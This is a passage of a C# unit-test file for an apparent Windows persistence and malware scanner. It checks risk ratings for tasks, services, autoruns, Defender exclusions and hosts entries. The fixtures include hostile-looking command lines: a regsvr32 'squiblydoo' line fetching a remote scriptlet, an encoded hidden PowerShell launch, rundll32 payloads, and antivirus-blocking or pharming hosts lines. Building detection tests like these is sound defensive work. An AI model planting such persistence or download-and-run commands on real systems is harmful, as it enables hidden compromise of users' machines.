            w.Write((ushort)3); WStr(w, "A"); w.Write((ushort)0x7777); WStr(w, ""); Guid g = Guid.NewGuid(); w.Write(g.ToByteArray()); WStr(w, "data"); w.Flush();
            a = Heur.TaskCacheActions(ms.ToArray());
            True(a != null && a.Count == 1 && a[0][0] == "com" && a[0][1] == g.ToString("B") && a[0][2] == "data", "COM action");
            List<string> p = Heur.PrintableStrings(cut, 4);
            True(p.Exists(delegate(string s) { return s.Contains("C:\\x.exe"); }), "printable fallback shows the command");
            True(Heur.IsGuid("{0F1E2D3C-4B5A-6978-8796-A5B4C3D2E1F0}") && !Heur.IsGuid("{x}\\..\\a"), "IsGuid");
            Eq(Heur.CmdKey("\"%windir%\\a.exe\"", "-x  y"), Heur.CmdKey("C:\\Windows\\a.exe".Replace("C:", ""), "-X y"), "CmdKey");
        }

        // ScanTasks: XML + TaskCache join, risk from actions only, TaskCache keys removed with the task,
        // registry-only / SD-less tasks, XML vs registry mismatch, unreadable / denied
        static void ScanTasksCases()
        {
            string dir = Path.Combine(Path.GetTempPath(), "rs tasks " + Id);
            string tasks = Path.Combine(dir, "Tasks");
            string autochk = Path.Combine(Path.Combine(Path.Combine(tasks, "Microsoft"), "Windows"), "Autochk");
            Directory.CreateDirectory(autochk);
            try
            {
                string soft = Root + "\\tsoft";
                string tc = "tsoft\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache";
                string g1 = "{11111111-1111-1111-1111-111111111111}", g2 = "{22222222-2222-2222-2222-222222222222}", g3 = "{33333333-3333-3333-3333-333333333333}";
                // 1) built-in task: clean although the XML has an http xmlns and "rundll32 powershell http" in its description
                File.WriteAllText(Path.Combine(autochk, "Proxy"),
                    TaskXml("<Exec><Command>%windir%\\system32\\rundll32.exe</Command><Arguments>/d acproxy.dll,PerformAutochkOperations</Arguments></Exec>"), Encoding.Unicode);
                using (RegistryKey k = Make(tc + "\\Tree\\Microsoft\\Windows\\Autochk\\Proxy")) { k.SetValue("Id", g1); k.SetValue("SD", new byte[] { 1 }); k.SetValue("Index", 3); }
                using (RegistryKey k = Make(tc + "\\Tasks\\" + g1)) { k.SetValue("Path", "\\Microsoft\\Windows\\Autochk\\Proxy"); k.SetValue("Actions", ActionsBlob("%windir%\\system32\\rundll32.exe", "/d acproxy.dll,PerformAutochkOperations")); }
                using (RegistryKey k = Make(tc + "\\Plain\\" + g1)) { }
                // 2) GhostTask overwrite: XML benign, registry runs something else
                File.WriteAllText(Path.Combine(tasks, "Updater"), TaskXml("<Exec><Command>C:\\Windows\\System32\\defrag.exe</Command></Exec>"), Encoding.Unicode);
                using (RegistryKey k = Make(tc + "\\Tree\\Updater")) { k.SetValue("Id", g2); k.SetValue("SD", new byte[] { 1 }); k.SetValue("Index", 3); }
                using (RegistryKey k = Make(tc + "\\Tasks\\" + g2)) { k.SetValue("Path", "\\Updater"); k.SetValue("Actions", ActionsBlob("C:\\ProgramData\\x\\svc.exe", "")); }
                // 3) registry-only task without SD (Tarrask), plus a Tree entry pointing at another task's Id
                using (RegistryKey k = Make(tc + "\\Tree\\Hidden")) { k.SetValue("Id", g3); k.SetValue("Index", 1); }
                using (RegistryKey k = Make(tc + "\\Tasks\\" + g3)) { k.SetValue("Path", "\\Hidden"); k.SetValue("Actions", ActionsBlob("C:\\Windows\\System32\\calc.exe", "")); }
                using (RegistryKey k = Make(tc + "\\Logon\\" + g3)) { }
                using (RegistryKey k = Make(tc + "\\Tree\\Thief")) { k.SetValue("Id", g1); k.SetValue("SD", new byte[] { 1 }); }
                // 4) a checker that re-adds autoruns; 5) a big non-task file
                File.WriteAllText(Path.Combine(tasks, "Checker"), TaskXml("<Exec><Command>cmd.exe</Command><Arguments>/c reg add HKCU\\x /v y /d z /f</Arguments></Exec>"), Encoding.Unicode);
                File.WriteAllText(Path.Combine(tasks, "Big"), new string('x', 1024 * 1024 + 10));
                List<Finding> f = new List<Finding>();
                MainForm.ScanTasks(f, tasks, soft, false, new List<string>());
                Finding proxy = FindName(f, "Microsoft\\Windows\\Autochk\\Proxy");
                True(proxy != null, "built-in task listed");
                Eq("", proxy.Risk, "built-in task is clean (no xmlns/description match, XML = registry)");
                Eq(2, proxy.Kind, "task file");
                Eq(3, proxy.AlsoKeys.Count, "Tree + Tasks + Plain keys go with the task");
                True(proxy.AlsoKeys[1].EndsWith("\\Tasks\\" + g1) && proxy.AlsoKeys[2].EndsWith("\\Plain\\" + g1), "TaskCache key paths");
                Finding up = FindName(f, "Updater");
                Eq("REVIEW", up.Risk, "XML / registry mismatch");
                True(up.Value.Contains("C:\\ProgramData\\x\\svc.exe"), "the command Windows really runs is shown");
                Finding hid = FindName(f, "Hidden") ?? FindName(f, "hidden");   // (Mono's registry lower-cases key names)
                Eq("SUSPECT", hid.Risk, "registry-only task without SD");
                Eq(1, hid.Kind, "Tree key");
                True(hid.DelKey.EndsWith("\\Tree\\Hidden", StringComparison.OrdinalIgnoreCase), "removes the Tree key");
                Eq(2, hid.AlsoKeys.Count, "and Tasks + Logon");
                Finding thief = FindName(f, "Thief") ?? FindName(f, "thief");
                True(thief == null, "a Tree entry with a foreign Id and no Actions of its own is not acted on");
                Eq("SUSPECT", FindName(f, "Checker").Risk, "checker (reg add) in the arguments");
                Eq("Task *checker?*", FindName(f, "Checker").Category, "checker category");
                Finding big = FindName(f, "Big");
                Eq(3, big.Kind, "over-sized file: info only");
                Eq("SUSPECT", big.Risk, "offline: unreadable task is SUSPECT");
                f.Clear();
                MainForm.ScanTasks(f, tasks, soft, true, new List<string>());
                Eq("REVIEW", FindName(f, "Big").Risk, "live: REVIEW");
                f.Clear();
                MainForm.ScanTasks(f, Path.Combine(dir, "nope"), "", false, null);
                Eq(0, f.Count, "no folder, no SOFTWARE: nothing, no exception");
            }
            finally { try { Directory.Delete(dir, true); } catch { } }
        }

        static void ControlSetCases()
        {
            Predicate<string> has12 = delegate(string cs) { return cs == "ControlSet001" || cs == "ControlSet002"; };
            string w;
            List<string[]> sel = new List<string[]>();
            sel.Add(new string[] { "Current", "0x1", "REG_DWORD" }); sel.Add(new string[] { "Default", "0x1", "REG_DWORD" }); sel.Add(new string[] { "LastKnownGood", "0x2", "REG_DWORD" });
            Eq("ControlSet001", MainForm.PickControlSet(sel, has12, out w), "default"); Eq("", w, "no warning");
            sel[1] = new string[] { "Default", "0x2", "REG_DWORD" };
            Eq("ControlSet002", MainForm.PickControlSet(sel, has12, out w), "Default wins (next boot)"); True(w.Length > 0, "mismatch warned");
            sel[1] = new string[] { "Default", "0x63", "REG_DWORD" };
            Eq("ControlSet001", MainForm.PickControlSet(sel, has12, out w), "missing Default -> Current"); True(w.Contains("ControlSet099"), "warned");
            sel.Clear(); sel.Add(new string[] { "Default", "a\n    Current    REG_DWORD    0x2", "REG_SZ" });
            Eq("ControlSet001", MainForm.PickControlSet(sel, has12, out w), "a REG_SZ never counts");
        }

        // Session Manager extras: clean (absent / empty) = no row; AppCertDlls is a key whose values are DLLs;
        // HKLM Policies\Explorer\Run is listed once, the Wow6432Node copy (not consulted) not at all
        static void SessionMgrExtraCases()
        {
            using (RegistryKey k = Make("smx")) { k.SetValue("Execute", new string[] { "" }, RegistryValueKind.MultiString); k.SetValue("PlatformExecute", new string[0], RegistryValueKind.MultiString); }
            List<Finding> f = new List<Finding>();
            MainForm.ScanSessionManagerExtra(f, Root + "\\smx");
            Eq(0, f.Count, "clean defaults: no rows");
            using (RegistryKey k = Make("smx")) { k.SetValue("BootExecuteNoPnpSync", new string[] { "evil" }, RegistryValueKind.MultiString); k.SetValue("AppCertDlls", "decoy (a value, not the key)"); }
            using (RegistryKey k = Make("smx\\AppCertDlls")) { k.SetValue("x", "C:\\ProgramData\\ac.dll"); k.SetValue("e", ""); }
            MainForm.ScanSessionManagerExtra(f, Root + "\\smx");
            Eq(2, f.Count, "NoPnpSync + one AppCertDll");
            Finding a = FindName(f, "x");
            Eq("SUSPECT", a.Risk, "AppCertDll SUSPECT");
            Eq(0, a.Kind, "value deleted, not the key");
            True(a.DelKey.EndsWith("\\AppCertDlls"), "in the AppCertDlls key");
            Eq("SUSPECT", FindName(f, "BootExecuteNoPnpSync").Risk, "BootExecuteNoPnpSync");
            using (RegistryKey k = Make("pol\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run")) k.SetValue("gpo", "C:\\Program Files\\x\\a.exe");
            using (RegistryKey k = Make("pol\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run")) k.SetValue("w", "C:\\x.exe");
            f.Clear();
            MainForm.ScanExtraSoftware(f, Root + "\\pol");
            int n = 0; foreach (Finding x in f) if (x.Name == "gpo" || x.Name == "w") n++;
            Eq(1, n, "Policies Run once, native only");
        }

        // Services: clean Windows 10/11 ImagePaths are not listed (incl. Defender in ProgramData); REVIEW locations are
        // listed; interpreters / scripts / Windows-root images are SUSPECT. Active Setup: Microsoft components clean.
        static void ServiceAndActiveSetupCases()
        {
            string[] clean = {
                "\\SystemRoot\\System32\\drivers\\ACPI.sys", "system32\\drivers\\wd\\WdFilter.sys", "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
                "C:\\Windows\\system32\\lsass.exe", "%SystemRoot%\\system32\\msiexec.exe /V", "C:\\Windows\\servicing\\TrustedInstaller.exe",
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe", "%systemroot%\\system32\\spoolsv.exe",
                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe\"",
                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\NisSrv.exe\"",
                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpDefenderCoreService.exe\"",
                "\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5B1F2B0C-8E0B-4F2B-9C1E-1234567890AB}\\MpKslDrv.sys",
                "\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"",
                "\\SystemRoot\\System32\\DriverStore\\FileRepository\\nv.inf_amd64_x\\nvlddmkm.sys", "", "System32\\drivers\\fvevol.sys",
            };
            foreach (string c in clean) Eq("", MainForm.ServiceRisk(c), "clean service: " + c);
            Eq("REVIEW", MainForm.ServiceRisk("C:\\ProgramData\\WindowsTask\\svchost.exe"), "ProgramData service listed");
            Eq("REVIEW", MainForm.ServiceRisk("C:\\Users\\Public\\Libraries\\svc.exe"), "Public service listed");
            Eq("REVIEW", MainForm.ServiceRisk("\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\..\\..\\x\\MsMpEng.exe\""), "no .. games");
            string[] bad = {
                "cmd.exe /c start C:\\ProgramData\\w\\checker.bat", "cmd /c C:\\Windows\\upd.bat", "wscript.exe C:\\Windows\\w.vbs",
                "C:\\Windows\\System32\\cmd.exe /c powershell -nop -w 1 -e JAB", "%COMSPEC% /c x", "C:\\Windows\\svchost.exe", "C:\\Windows\\Temp\\svc.exe",
                "powershell -File C:\\Windows\\x.ps1", "C:\\Windows\\x.bat",
            };
            foreach (string c in bad) Eq("SUSPECT", MainForm.ServiceRisk(c), "SUSPECT service: " + c);
            using (RegistryKey k = Make("svc\\Services\\good")) k.SetValue("ImagePath", "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p");
            using (RegistryKey k = Make("svc\\Services\\good\\Parameters")) k.SetValue("ServiceDll", "%SystemRoot%\\System32\\wuaueng.dll");
            using (RegistryKey k = Make("svc\\Services\\miner")) k.SetValue("ImagePath", "C:\\ProgramData\\WindowsTask\\svchost.exe");
            using (RegistryKey k = Make("svc\\Services\\bat")) k.SetValue("ImagePath", "cmd.exe /c start C:\\ProgramData\\w\\checker.bat");
            using (RegistryKey k = Make("svc\\Services\\dll\\Parameters")) k.SetValue("ServiceDll", "C:\\Users\\Public\\x.dll");
            List<Finding> f = new List<Finding>();
            MainForm.ScanServices(f, Root + "\\svc", new List<string>());
            Eq(3, f.Count, "miner + bat + ServiceDll");
            Eq("REVIEW", FindName(f, "miner").Risk, "miner REVIEW (listed)");
            Eq("SUSPECT", FindName(f, "bat").Risk, "cmd service SUSPECT");
            Finding d = FindName(f, "dll");
            Eq(0, d.Kind, "ServiceDll: the value");
            Eq("ServiceDll", d.DelName, "value name");
            // Active Setup: Microsoft components of a clean Windows 10/11
            string[][] ms = {
                new string[] { "{2C7339CF-2B09-4501-B3F3-F3508C9228ED}", "%SystemRoot%\\system32\\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\\system32\\themeui.dll" },
                new string[] { "{89820200-ECBD-11cf-8B85-00AA005B4340}", "regsvr32.exe /s /n /i:U shell32.dll" },
                new string[] { "{2D46B6DC-2207-486B-B523-A557E6D54B47}", "C:\\Windows\\System32\\cmd.exe /D /C start C:\\Windows\\System32\\ie4uinit.exe -ClearIconCache" },
                new string[] { ">{26923b43-4d38-484f-9b9e-de460746276c}", "C:\\Windows\\System32\\ie4uinit.exe -UserConfig" },
                new string[] { "{89B4C1CD-B018-4511-B0A1-5476DBF70820}", "C:\\Windows\\System32\\Rundll32.exe C:\\Windows\\System32\\mscories.dll,Install" },
                new string[] { "{89B4C1CD-B018-4511-B0A1-5476DBF70820}", "C:\\Windows\\SysWOW64\\Rundll32.exe C:\\Windows\\SysWOW64\\mscories.dll,Install" },
                new string[] { "{6BF52A52-394A-11d3-B153-00C04F79FAA6}", "\"%SystemRoot%\\system32\\unregmp2.exe\" /FirstLogon" },
                new string[] { ">{22d6f312-b0f6-11d0-94ab-0080c74c7e95}", "%SystemRoot%\\system32\\unregmp2.exe /ShowWMP" },
                new string[] { "{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}", "\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenAdmin" },
                new string[] { "{44BBA840-CC51-11CF-AAFA-00AA00B6015C}", "\"%ProgramFiles%\\Windows Mail\\WinMail.exe\" OCInstallUserConfigOE" },
                new string[] { "{9459C573-B17A-45AE-9F64-1857B5D58CEE}", "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\130.0.2849.68\\Installer\\setup.exe\" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable" },
            };
            foreach (string[] a in ms) True(Defaults.ActiveSetupClean(a[0], a[1]), "built-in Active Setup clean: " + a[0]);
            True(!Defaults.ActiveSetupClean("{2D46B6DC-2207-486B-B523-A557E6D54B47}", "C:\\Windows\\System32\\cmd.exe /D /C start C:\\Windows\\System32\\ie4uinit.exe & C:\\ProgramData\\x.exe"), "chained command");
            True(!Defaults.ActiveSetupClean("{2C7339CF-2B09-4501-B3F3-F3508C9228ED}", "C:\\ProgramData\\regsvr32.exe /s themeui.dll"), "wrong folder");
            True(!Defaults.ActiveSetupClean("{2C7339CF-2B09-4501-B3F3-F3508C9228ED}", "regsvr32 /s /i:http://x/a.sct scrobj.dll themeui.dll"), "squiblydoo");
            True(!Defaults.ActiveSetupClean("{11111111-2B09-4501-B3F3-F3508C9228ED}", "regsvr32.exe /s /n /i:U shell32.dll"), "unknown GUID");
            using (RegistryKey k = Make("as\\Microsoft\\Active Setup\\Installed Components\\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}")) k.SetValue("StubPath", ms[0][1]);
            using (RegistryKey k = Make("as\\Microsoft\\Active Setup\\Installed Components\\{00000000-0000-0000-0000-00000000BAD1}")) k.SetValue("StubPath", "C:\\ProgramData\\x\\a.exe");
            f.Clear();
            MainForm.ScanExtraSoftware(f, Root + "\\as");
            int clean2 = 0, rev = 0;
            foreach (Finding x in f) if (x.Category == "Active Setup") { if (x.Risk == "") clean2++; else if (x.Risk == "REVIEW") rev++; }
            Eq(1, clean2, "Themes Setup row clean"); Eq(1, rev, "unknown component REVIEW");
        }

        // Per-user hive: a clean profile (OneDrive in Run, Wallpaper, a System32 screensaver, empty Load) has no
        // SUSPECT row; HKCU Winlogon Shell, Policies\System\Shell, cmd AutoRun, logon script are SUSPECT value rows.
        static void UserHiveCases()
        {
            using (RegistryKey k = Make("u1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")) k.SetValue("OneDrive", "\"C:\\Users\\V\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background");
            using (RegistryKey k = Make("u1\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows")) k.SetValue("Load", "");
            using (RegistryKey k = Make("u1\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")) { k.SetValue("ExcludeProfileDirs", "AppData\\Local"); k.SetValue("BuildNumber", 19045); }
            using (RegistryKey k = Make("u1\\Control Panel\\Desktop")) { k.SetValue("Wallpaper", "C:\\Windows\\web\\wallpaper\\Windows\\img0.jpg"); k.SetValue("SCRNSAVE.EXE", "C:\\Windows\\system32\\Mystify.scr"); }
            using (RegistryKey k = Make("u1\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders")) k.SetValue("Startup", "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", RegistryValueKind.ExpandString);
            List<Finding> f = new List<Finding>();
            MainForm.ScanUserHive(f, "V", Root + "\\u1");
            foreach (Finding x in f) True(x.Risk != "SUSPECT", "clean profile: " + x.Category + " " + x.Value);
            Eq("", FindName(f, "SCRNSAVE.EXE").Risk, "System32 screensaver clean");
            using (RegistryKey k = Make("u2\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")) k.SetValue("shell", "explorer.exe,%APPDATA%\\msconfig.dat");
            using (RegistryKey k = Make("u2\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")) { k.SetValue("Shell", "C:\\ProgramData\\lock.exe"); k.SetValue("DisableTaskMgr", 1); }
            using (RegistryKey k = Make("u2\\Software\\Microsoft\\Command Processor")) k.SetValue("AutoRun", "C:\\ProgramData\\x.bat");
            using (RegistryKey k = Make("u2\\Environment")) { k.SetValue("UserInitMprLogonScript", "C:\\Users\\V\\x.bat"); k.SetValue("TEMP", "%USERPROFILE%\\AppData\\Local\\Temp"); }
            using (RegistryKey k = Make("u2\\Control Panel\\Desktop")) k.SetValue("SCRNSAVE.EXE", "C:\\Users\\V\\AppData\\Roaming\\x.scr");
            using (RegistryKey k = Make("u2\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop")) k.SetValue("SCRNSAVE.EXE", "D:\\Saver\\nice.scr ");
            f.Clear();
            MainForm.ScanUserHive(f, "V", Root + "\\u2");
            Finding sh = FindName(f, "shell");
            True(sh != null && sh.Risk == "SUSPECT" && sh.Kind == 0 && sh.DelName == "shell", "HKCU Winlogon Shell: SUSPECT, delete the override value");
            Finding ps = null; foreach (Finding x in f) if (x.Category.StartsWith("Policies Shell")) ps = x;
            True(ps != null && ps.Risk == "SUSPECT", "Policies\\System\\Shell");
            Eq("SUSPECT", FindName(f, "AutoRun").Risk, "HKCU cmd AutoRun");
            Eq("SUSPECT", FindName(f, "UserInitMprLogonScript").Risk, "logon script");
            int scr = 0; foreach (Finding x in f) if (x.Name == "SCRNSAVE.EXE") { scr++; True(x.Risk == "SUSPECT" || x.Risk == "REVIEW", "screensaver listed"); }
            Eq(2, scr, "both screensaver values");
            Eq("REVIEW", MainForm.ScreensaverRisk("D:\\Saver\\nice.scr"), "outside System32 but no other sign: REVIEW");
            Eq("SUSPECT", MainForm.ScreensaverRisk("C:\\Users\\V\\AppData\\Roaming\\x.scr"), "profile .scr");
            Eq("", MainForm.ScreensaverRisk("scrnsave.scr"), "bare name");
            Eq(4 + 2, f.Count, "no other rows (TEMP, DisableTaskMgr not listed here)");
        }

        // B7 additions: clean defaults give no SUSPECT; planted entries are found with the documented risk / kind
        static void MachineExtrasCases()
        {
            // clean: AeDebug with Auto=1 + AutoExclusionList and no Debugger, empty exclusion keys, empty RunOnceEx
            using (RegistryKey k = Make("mx\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug")) { k.SetValue("Auto", "1"); k.SetValue("UserDebuggerHotKey", 0); }
            using (RegistryKey k = Make("mx\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\\AutoExclusionList")) k.SetValue("DWM.exe", 1);
            using (RegistryKey k = Make("mx\\Microsoft\\Windows Defender\\Exclusions\\Paths")) { }
            using (RegistryKey k = Make("mx\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx")) k.SetValue("Flags", 0);
            List<Finding> f = new List<Finding>();
            MainForm.ScanMachineExtras(f, Root + "\\mx");
            Eq(0, f.Count, "clean defaults: no rows");
            using (RegistryKey k = Make("mx\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug")) k.SetValue("Debugger", "C:\\ProgramData\\x\\dbg.exe -p %ld");
            using (RegistryKey k = Make("mx\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug")) { k.SetValue("Debugger", "\"C:\\WINDOWS\\system32\\vsjitdebugger.exe\" -p %ld -e %ld"); k.SetValue("Auto", "1"); }
            using (RegistryKey k = Make("mx\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001")) k.SetValue("1", "C:\\x.exe");
            using (RegistryKey k = Make("mx\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend")) k.SetValue("1", "C:\\x.dll");
            using (RegistryKey k = Make("mx\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList")) { k.SetValue("hacker", 0); k.SetValue("shown", 1); }
            using (RegistryKey k = Make("mx\\Microsoft\\Windows Defender\\Exclusions\\Paths")) { k.SetValue("C:\\", 0); k.SetValue("D:\\Projects\\build", 0); }
            using (RegistryKey k = Make("mx\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Extensions")) k.SetValue("exe", 0);
            f.Clear();
            MainForm.ScanMachineExtras(f, Root + "\\mx");
            Finding ae = null, aew = null, roe = null, hid = null;
            foreach (Finding x in f)
            {
                if (x.Category == "AeDebug") ae = x;
                if (x.Category == "AeDebug (WOW64)") aew = x;
                if (x.Category.StartsWith("RunOnceEx")) roe = x;
                if (x.Name == "hacker") hid = x;
            }
            Eq("SUSPECT", ae.Risk, "unknown AeDebug debugger with Auto=1");
            Eq("Debugger", ae.DelName, "only the Debugger value is removed");
            Eq("REVIEW", aew.Risk, "Visual Studio JIT debugger");
            Eq("SUSPECT", roe.Risk, "RunOnceEx entry"); Eq(1, roe.Kind, "RunOnceEx subkey deleted");
            True(roe.Value.Contains("x.dll"), "Depend DLL shown");
            Eq("REVIEW", hid.Risk, "hidden user REVIEW"); True(FindName(f, "shown") == null, "visible user not listed");
            Eq("SUSPECT", FindName(f, "C:\\").Risk, "drive-root exclusion");
            Eq("REVIEW", FindName(f, "D:\\Projects\\build").Risk, "project folder exclusion");
            Eq("SUSPECT", FindName(f, "exe").Risk, ".exe excluded by policy");
            Eq("REVIEW", MainForm.AeDebugRisk("C:\\x\\dbg.exe", "0"), "Auto=0 asks first");
            Eq("SUSPECT", MainForm.DefenderExclusionRisk("Paths", "%TEMP%"), "temp excluded");
            Eq("SUSPECT", MainForm.DefenderExclusionRisk("Paths", "C:\\Users\\V\\AppData\\Roaming"), "AppData excluded");
            // SYSTEM\Setup
            using (RegistryKey k = Make("sys1\\Setup")) { k.SetValue("CmdLine", ""); k.SetValue("SetupType", 0); k.SetValue("SystemSetupInProgress", 0); }
            f.Clear(); MainForm.ScanSetupKey(f, Root + "\\sys1"); Eq(0, f.Count, "clean Setup");
            using (RegistryKey k = Make("sys1\\Setup")) { k.SetValue("CmdLine", "oobe\\windeploy.exe"); k.SetValue("SetupType", 2); }
            f.Clear(); MainForm.ScanSetupKey(f, Root + "\\sys1"); Eq(1, f.Count, "OOBE in progress: one info row"); Eq("REVIEW", f[0].Risk, "REVIEW"); Eq(3, f[0].Kind, "not touched");
            using (RegistryKey k = Make("sys1\\Setup")) { k.SetValue("CmdLine", "cmd.exe"); k.SetValue("SetupType", 2); }
            f.Clear(); MainForm.ScanSetupKey(f, Root + "\\sys1");
            Eq(2, f.Count, "CmdLine + SetupType resets");
            Eq(4, f[0].Kind, "reset"); Eq("", (string)f[0].ResetData, "CmdLine -> empty");
            Eq(0, (int)f[1].ResetData, "SetupType -> 0"); Eq(RegistryValueKind.DWord, f[1].ResetType, "DWORD");
            // DataBasePath
            using (RegistryKey k = Make("ccs1\\Services\\Tcpip\\Parameters")) k.SetValue("DataBasePath", "%SystemRoot%\\System32\\drivers\\etc", RegistryValueKind.ExpandString);
            f.Clear(); MainForm.ScanDataBasePath(f, Root + "\\ccs1"); Eq(0, f.Count, "default DataBasePath");
            using (RegistryKey k = Make("ccs1\\Services\\Tcpip\\Parameters")) k.SetValue("DataBasePath", "C:\\ProgramData\\etc", RegistryValueKind.ExpandString);
            f.Clear(); MainForm.ScanDataBasePath(f, Root + "\\ccs1");
            Eq(1, f.Count, "moved DataBasePath"); Eq(4, f[0].Kind, "reset, never deleted"); Eq(RegistryValueKind.ExpandString, f[0].ResetType, "REG_EXPAND_SZ");
            // IFEO VerifierDlls
            using (RegistryKey k = Make("vf\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe")) { k.SetValue("VerifierDlls", "evil.dll"); k.SetValue("GlobalFlag", 0x100); }
            f.Clear(); MainForm.ScanIfeo(f, Root + "\\vf", new List<string>());
            Eq(1, f.Count, "VerifierDlls row"); Eq("VerifierDlls", f[0].DelName, "deletes VerifierDlls only");
            True(!f[0].Category.StartsWith("IFEO"), "not an IFEO-Debugger category (Defuse would remove Debugger)");
        }

        // hosts: Microsoft's default file (comments only) and localhost lines are clean; AV / update blocks and
        // pharming are SUSPECT; other lines REVIEW
        static void HostsCases()
        {
            string def = "# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\r\n#\r\n" +
                "#      102.54.94.97     rhino.acme.com          # source server\r\n#       38.25.63.10     x.acme.com              # x client host\r\n\r\n" +
                "# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n";
            Eq(0, Heur.HostsEntries(def).Count, "Microsoft default hosts");
            Eq(0, Heur.HostsEntries("127.0.0.1 localhost\n::1 localhost # x\n").Count, "explicit localhost lines");
            List<string[]> e = Heur.HostsEntries("127.0.0.1 localhost kaspersky.com www.drweb.ru\n0.0.0.0 ads.example.net\n93.184.216.34 www.google.com\n10.0.0.5 nas.local\n");
            Eq(5, e.Count, "one entry per name, localhost dropped");
            Eq("SUSPECT", Heur.HostsRisk(e[0][0], e[0][1]), "AV site blocked");
            Eq("SUSPECT", Heur.HostsRisk(e[1][0], e[1][1]), "AV site blocked (2)");
            Eq("REVIEW", Heur.HostsRisk(e[2][0], e[2][1]), "ad block line");
            Eq("SUSPECT", Heur.HostsRisk(e[3][0], e[3][1]), "pharming");
            Eq("REVIEW", Heur.HostsRisk(e[4][0], e[4][1]), "LAN name");
            Eq("REVIEW", Heur.HostsRisk("127.0.0.1", "www.google.com"), "a popular site blocked to loopback is only REVIEW");
            Eq("REVIEW", Heur.HostsRisk("0.0.0.0", "preset.example.io"), "'eset' inside a word is not ESET");
            string dir = Path.Combine(Path.GetTempPath(), "rs hosts " + Id);
            Directory.CreateDirectory(dir);
            try
            {
                string h = Path.Combine(dir, "hosts");
                StringBuilder sb = new StringBuilder(def);
                for (int i = 0; i < 40; i++) sb.Append("0.0.0.0 ad" + i + ".example.net\n");
                sb.Append("127.0.0.1 update.microsoft.com\n");
                File.WriteAllText(h, sb.ToString());
                List<Finding> f = new List<Finding>();
                MainForm.ScanHosts(f, h, false);
                Eq(32, f.Count, "30 REVIEW + 1 SUSPECT + summary");
                int sus = 0; foreach (Finding x in f) { Eq(3, x.Kind, "hosts rows are info"); if (x.Risk == "SUSPECT") sus++; }
                Eq(1, sus, "Windows Update block");
                f.Clear(); File.WriteAllText(h, def); MainForm.ScanHosts(f, h, false); Eq(0, f.Count, "default file: nothing");
            }
            finally { try { Directory.Delete(dir, true); } catch { } }
        }

        // minimal [MS-SHLLINK] file: header, LinkInfo with a LocalBasePath (ANSI), Unicode ARGUMENTS
        static byte[] MakeLnk(string target, string args)
        {
            MemoryStream ms = new MemoryStream(); BinaryWriter w = new BinaryWriter(ms);
            w.Write((uint)0x4C); w.Write(new byte[16]);
            w.Write((uint)(0x2 | 0x20 | 0x80));   // HasLinkInfo | HasArguments | IsUnicode
            w.Write(new byte[0x4C - 0x18]);
            byte[] lbp = Encoding.ASCII.GetBytes(target + "\0");
            int hdr = 0x1C, size = hdr + lbp.Length + 1;
            w.Write((uint)size); w.Write((uint)hdr); w.Write((uint)1); w.Write((uint)0); w.Write((uint)hdr); w.Write((uint)0); w.Write((uint)(hdr + lbp.Length));
            w.Write(lbp); w.Write((byte)0);
            w.Write((ushort)args.Length); w.Write(Encoding.Unicode.GetBytes(args));
            w.Flush(); return ms.ToArray();
        }

        // Startup items, .lnk targets, payload (not interpreter) of a command line
        static void StartupAndPayloadCases()
        {
            Eq("C:\\Users\\x\\AppData\\Roaming\\evil.dll", Heur.PayloadPath("C:\\Windows\\System32\\rundll32.exe C:\\Users\\x\\AppData\\Roaming\\evil.dll,Start"), "rundll32 payload");
            Eq("C:\\ProgramData\\a.ps1", Heur.PayloadPath("\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -File C:\\ProgramData\\a.ps1"), "powershell -File payload");
            Eq("", Heur.PayloadPath("powershell.exe -e JABz"), "only an interpreter: nothing flagged");
            Eq("C:\\Program Files\\My App\\app.exe", Heur.PayloadPath("C:\\Program Files\\My App\\app.exe -min"), "unquoted path with spaces");
